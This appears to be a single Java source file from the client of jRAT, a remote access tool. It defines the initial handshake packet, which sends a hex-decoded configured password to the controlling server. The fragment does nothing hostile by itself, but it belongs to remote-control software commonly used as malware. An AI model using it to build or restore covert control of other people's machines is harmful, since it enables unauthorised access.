package jrat.client.packets.outgoing;

import jrat.common.codec.Hex;
import jrat.common.io.StringWriter;
import jrat.client.Configuration;
import java.io.DataOutputStream;

public class Packet1InitHandshake extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
		String data = Configuration.getPass();

		dos.write(Hex.decodeToBytes(data));
	}

	@Override
	public short getPacketId() {
		return (byte) 1;
	}

}